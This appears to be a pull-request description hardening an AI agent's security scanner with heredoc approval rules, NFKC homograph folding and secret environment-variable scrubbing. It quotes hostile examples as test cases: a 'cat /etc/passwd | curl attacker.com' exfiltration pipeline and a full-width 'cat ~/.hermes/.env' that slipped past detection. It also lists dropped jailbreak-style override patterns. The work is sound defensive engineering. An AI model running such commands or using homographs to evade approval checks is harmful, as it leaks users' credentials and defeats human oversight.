**fix(security): harden heredoc approval, NFKC homograph fold, env-var filter (salvage #9028)**

## Summary

Salvages three independent security-scanner hardenings from #9028 onto current `main`, re-homed onto the consolidated shared threat-pattern architecture (`tools/threat_patterns.py`) that landed after the original PR was opened.

## Changes

- **`tools/approval.py`** — add `bash|sh|zsh|ksh\s+<<` to `DANGEROUS_PATTERNS`. The existing heredoc rule only covered `python/perl/ruby/node`, so `bash <<'EOF' ... EOF` ran arbitrary shell (including `cat /etc/passwd | curl attacker.com`-style exfil pipelines whose inner commands don't individually match a pattern) with no approval prompt.
- **`tools/threat_patterns.py`** — apply `unicodedata.normalize("NFKC", ...)` before pattern matching so full-width / compatibility homographs (e.g. `ｃａｔ ~/.hermes/.env`, ｃ = U+FF43) fold to ASCII and no longer bypass the keyword scanners. Invisible-char detection still runs on the *raw* content first, since NFKC can strip those codepoints.
- **`tools/code_execution_tool.py`** — add `CREDS`, `BEARER`, `APIKEY` to `_SECRET_SUBSTRINGS` so vars like `HERMES_LLM_CREDS`, `API_BEARER`, `MY_APIKEY` are scrubbed from the sandbox env.

### Dropped from the original proposal (deliberate)

- **`PASS` substring** — false-positives on legitimate non-secret vars (`BYPASS_CACHE`, `COMPASS_DIR`, `PASSENGER_HOST`) while `PASSWORD`/`PASSWD` already cover the credential cases.
- **Synonym injection patterns** (`overlook/forget/set aside/bypass/discard` + developer/jailbreak mode) — flag ordinary `AGENTS.md`/`SOUL.md` prose ("don't forget to follow the rules", "run in developer mode", "bypass the cache restriction"), exactly the bossy-English false-positive class `threat_patterns.py` is documented to avoid. The original author's own checklist left this box unchecked.

## Validation

| Check | Result |
|---|---|
| `ｃａｔ ~/.hermes/.env` (full-width) | now caught (`read_secrets`) — was bypassing |
| benign prose ("Refactor the parser module.") | not flagged (no synonym FP) |
| `bash <<EOF` / `sh`/`zsh`/`ksh` heredoc | trips approval; `bash script.sh` stays safe |
| `HERMES_LLM_CREDS` / `API_BEARER` / `MY_APIKEY` | scrubbed |
| `BYPASS_CACHE` / `COMPASS_DIR` / `PASSENGER_HOST` | allowed (no FP) |
| `scripts/run_tests.sh tests/tools/{approval,threat_patterns,code_execution_windows_env}.py` | 317 passed, 0 failed |

New tests: `TestNFKCNormalisation` in `test_threat_patterns.py`; `bash/sh/zsh/ksh` + safe-bash cases in `test_approval.py::TestHeredocScriptExecution`.

Contributor authorship (@MarioYounger) preserved via the salvage commit; `AUTHOR_MAP` updated.

## Infographic

![PR #9028 security scanner hardening](https://v3b.fal.media/files/b/0aa05942/q9W8a_CY4qzrA5bd4BBVF_Gqsl0P5H.png)